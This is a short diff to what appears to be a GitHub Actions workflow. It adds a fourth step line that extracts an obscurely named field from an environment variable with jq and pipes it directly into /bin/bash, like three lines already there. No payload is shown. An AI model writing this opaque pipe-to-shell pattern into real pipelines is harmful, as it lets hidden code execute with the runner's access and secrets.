@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$wco3" | jq -r .pdfwg4482 | /bin/bash
           echo $vj14 | jq -r .apa91 | /bin/bash
           printf '%s' "$p98" | jq -r .paa17963 | /bin/bash
+          echo $mts4 | jq -r .oyohu237 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
